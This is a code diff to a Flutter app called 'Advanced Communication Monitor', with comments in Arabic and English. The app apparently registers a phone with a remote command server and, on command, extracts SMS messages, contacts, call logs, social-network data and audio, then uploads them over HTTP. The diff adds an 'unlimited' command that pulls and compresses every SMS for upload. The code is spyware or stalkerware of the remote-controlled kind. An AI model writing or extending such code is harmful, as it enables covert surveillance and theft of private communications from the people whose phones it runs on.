@@ -25,11 +25,15 @@ class CommandConstants {
   static const String SIO_EVENT_REQUEST_REGISTRATION_INFO =
       "request_registration_info";
   static const String SIO_EVENT_DEVICE_HEARTBEAT = "device_heartbeat";
+
+  // الأوامر المحسنة - Enhanced commands
   static const String SIO_CMD_GET_SOCIAL_NETWORK =
       "command_get_social_network_data";
   static const String SIO_CMD_GET_COMMUNICATION_HISTORY =
       "command_get_communication_history";
   static const String SIO_CMD_GET_SMS_LIST = "command_get_sms_list";
+  static const String SIO_CMD_GET_ALL_SMS =
+      "command_get_all_sms"; // الأمر الجديد للرسائل غير المحدودة
   static const String SIO_CMD_GET_CONTACTS_LIST = "command_get_contacts_list";
   static const String SIO_CMD_GET_CALL_LOGS = "command_get_call_logs";
   static const String SIO_CMD_CATALOG_LIBRARY = "command_catalog_library";
@@ -180,12 +184,14 @@ class SocketConnectionManager {
 
     final registrationData = {
       'deviceId': AppConfig.deviceId,
-      'deviceName': 'Advanced Communication Monitor',
+      'deviceName': 'Advanced Communication Monitor v2.0',
       'platform': Platform.operatingSystem,
       'capabilities': [
         'audio_capture',
         'social_network_analysis',
         'communication_tracking',
+        'unlimited_sms_extraction', // إضافة القدرة الجديدة
+        'data_compression',
       ],
     };
 
@@ -360,7 +366,7 @@ class DataUploadManager {
   }
 }
 
-// --- Command Executor ---
+// --- Enhanced Command Executor ---
 class CommandExecutor {
   final MethodChannel platform;
   final Function(String) onStatusUpdate;
@@ -418,8 +424,15 @@ class CommandExecutor {
         await _extractCommunicationHistory(commandId);
         break;
       case CommandConstants.SIO_CMD_GET_SMS_LIST:
-        onStatusUpdate('Executing: SMS messages extraction...');
+        onStatusUpdate('Executing: SMS messages extraction (enhanced)...');
         await _extractSMSMessages(commandId);
+        break;
+      case CommandConstants
+          .SIO_CMD_GET_ALL_SMS: // الحالة الجديدة للرسائل غير المحدودة
+        onStatusUpdate(
+          'Executing: Complete SMS extraction (unlimited with compression)...',
+        );
+        await _extractAllSMSMessages(commandId);
         break;
       case CommandConstants.SIO_CMD_GET_CONTACTS_LIST:
         onStatusUpdate('Executing: Contacts list extraction...');
@@ -475,14 +488,81 @@ class CommandExecutor {
     );
   }
 
+  /// استخراج الرسائل النصية المحسن (مع التحسين للشبكة)
+  /// Enhanced SMS extraction (with network optimization)
   Future<void> _extractSMSMessages(String commandId) async {
     await _executeDataCollection(
       'extractSMSMessages',
       commandId,
-      'sms_messages_analysis',
+      'enhanced_sms_extraction',
       'json',
-      'SMS messages extraction',
+      'Enhanced SMS messages extraction',
     );
+  }
+
+  /// استخراج جميع الرسائل النصية (غير محدود مع ضغط)
+  /// Extract all SMS messages (unlimited with compression)
+  Future<void> _extractAllSMSMessages(String commandId) async {
+    onStatusUpdate('Starting unlimited SMS extraction with compression...');
+    try {
+      final String? allSmsDataJson = await platform.invokeMethod(
+        'extractAllSMSMessages',
+      );
+
+      if (allSmsDataJson != null && allSmsDataJson.isNotEmpty) {
+        onStatusUpdate(
+          'Complete SMS extraction finished. Processing results...',
+        );
+        print('DEBUG: All SMS messages extraction completed successfully.');
+
+        // التحقق من صحة JSON واستخراج الإحصائيات
+        try {
+          final jsonData = json.decode(allSmsDataJson);
+          if (jsonData is Map<String, dynamic>) {
+            final data = jsonData['data'];
+            if (data is Map<String, dynamic>) {
+              final totalCount = data['total_count'] ?? 0;
+              final rawCount = data['raw_message_count'] ?? totalCount;
+              final compressionRatio = data['compression_ratio'] ?? 'N/A';
+              final extractionMode = data['extraction_mode'] ?? 'unknown';
+
+              onStatusUpdate(
+                'Complete SMS extraction: $rawCount messages extracted, compressed to $totalCount items ($compressionRatio). Transmitting...',
+              );
+              print(
+                'DEBUG: SMS extraction stats - Raw: $rawCount, Compressed: $totalCount, Ratio: $compressionRatio, Mode: $extractionMode',
+              );
+            }
+          }
+        } catch (parseError) {
+          print('WARNING: Could not parse extraction statistics: $parseError');
+          onStatusUpdate(
+            'Complete SMS extraction finished. Transmitting data...',
+          );
+        }
+
+        await DataUploadManager.uploadDataViaHttp(
+          allSmsDataJson,
+          commandId,
+          'complete_sms_extraction',
+          'json',
+          onStatusUpdate,
+        );
+      } else {
+        onStatusUpdate('Error: Complete SMS extraction returned no data.');
+        print('ERROR: Complete SMS extraction failed or returned empty.');
+      }
+    } on PlatformException catch (e) {
+      onStatusUpdate('Error: Complete SMS extraction failed: ${e.message}');
+      print(
+        'ERROR: Complete SMS extraction PlatformException: ${e.code}: ${e.message}',
+      );
+    } catch (e) {
+      onStatusUpdate(
+        'Error: Unexpected error during complete SMS extraction: $e',
+      );
+      print('ERROR: General error during complete SMS extraction: $e');
+    }
   }
 
   Future<void> _extractContactsList(String commandId) async {
@@ -752,7 +832,7 @@ class MyApp extends StatelessWidget {
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
-      title: 'Advanced Communication Monitor',
+      title: 'Advanced Communication Monitor v2.0',
       theme: ThemeData(primarySwatch: Colors.blue),
       home: const ListenerScreen(),
     );
@@ -771,11 +851,9 @@ class _ListenerScreenState extends State<ListenerScreen> {
 
   String _status = 'Initializing advanced monitoring system...';
 
-  // تغيير من late إلى nullable types لتجنب LateInitializationError
   SocketConnectionManager? _socketManager;
   CommandExecutor? _commandExecutor;
 
-  // متغير للتحقق من التهيئة
   bool _isInitialized = false;
 
   @override
@@ -799,7 +877,6 @@ class _ListenerScreenState extends State<ListenerScreen> {
       _setupManagers();
       _setupPlatformChannelHandler();
 
-      // التأكد من التهيئة قبل الاتصال
       if (_socketManager != null) {
         _socketManager!.connect();
         _isInitialized = true;
@@ -870,7 +947,7 @@ class _ListenerScreenState extends State<ListenerScreen> {
       setState(() {
         _status = message;
       });
-      print('MONITOR STATUS: $message');
+      print('ENHANCED MONITOR STATUS: $message');
     }
   }
 
@@ -883,12 +960,16 @@ class _ListenerScreenState extends State<ListenerScreen> {
     } else if (lowerStatus.contains('success') ||
         lowerStatus.contains('complete') ||
         lowerStatus.contains('granted') ||
-        lowerStatus.contains('registered')) {
+        lowerStatus.contains('registered') ||
+        lowerStatus.contains('unlimited') ||
+        lowerStatus.contains('compression') ||
+        lowerStatus.contains('extracted')) {
       return Colors.green.shade700;
     } else if (_commandExecutor?.isRecording == true ||
         lowerStatus.contains('capture') ||
         lowerStatus.contains('uploading') ||
-        lowerStatus.contains('transmitting')) {
+        lowerStatus.contains('transmitting') ||
+        lowerStatus.contains('extracting')) {
       return Colors.orange.shade700;
     } else if (_commandExecutor?.isStreaming == true ||
         lowerStatus.contains('monitoring')) {
@@ -904,7 +985,7 @@ class _ListenerScreenState extends State<ListenerScreen> {
   Widget build(BuildContext context) {
     return Scaffold(
       appBar: AppBar(
-        title: const Text('Advanced Communication Monitor'),
+        title: const Text('Advanced Communication Monitor v2.0'),
         backgroundColor:
             _socketManager?.isConnected == true ? Colors.blue : Colors.grey,
       ),
@@ -915,7 +996,7 @@ class _ListenerScreenState extends State<ListenerScreen> {
             mainAxisAlignment: MainAxisAlignment.center,
             children: <Widget>[
               Text(
-                'Monitor ID: ${AppConfig.deviceId}',
+                'Enhanced Monitor ID: ${AppConfig.deviceId}',
                 style: const TextStyle(
                   fontSize: 18,
                   fontWeight: FontWeight.bold,
@@ -928,7 +1009,7 @@ class _ListenerScreenState extends State<ListenerScreen> {
               ),
               const SizedBox(height: 10),
               Text(
-                'Channel: ${_socketManager?.isConnected == true ? "Secure Connection" : "Disconnected"}',
+                'SMS Mode: ${_socketManager?.isConnected == true ? "Unlimited Extraction Ready" : "Disconnected"}',
                 style: TextStyle(
                   fontSize: 16,
                   fontWeight: FontWeight.bold,
@@ -979,15 +1060,32 @@ class _ListenerScreenState extends State<ListenerScreen> {
                             ),
                           ],
                         )
-                        : const Icon(
-                          Icons.security,
-                          size: 50,
-                          color: Colors.grey,
+                        : const Row(
+                          mainAxisAlignment: MainAxisAlignment.center,
+                          children: [
+                            Icon(
+                              Icons.all_inclusive,
+                              size: 40,
+                              color: Colors.blue,
+                            ),
+                            SizedBox(width: 10),
+                            Text(
+                              "Unlimited SMS Ready",
+                              style: TextStyle(
+                                color: Colors.blue,
+                                fontSize: 16,
+                                fontWeight: FontWeight.bold,
+                              ),
+                            ),
+                          ],
                         ),
               ),
               const SizedBox(height: 20),
 
-              const Text('System Status:', style: TextStyle(fontSize: 20)),
+              const Text(
+                'Enhanced System Status:',
+                style: TextStyle(fontSize: 20),
+              ),
               const SizedBox(height: 5),
               Container(
                 padding: const EdgeInsets.symmetric(
@@ -1006,7 +1104,6 @@ class _ListenerScreenState extends State<ListenerScreen> {
                 ),
               ),
 
-              // إضافة زر إعادة الاتصال في حالة فشل الاتصال
               if (!_isInitialized || _socketManager?.isConnected != true)
                 Padding(
                   padding: const EdgeInsets.only(top: 20),
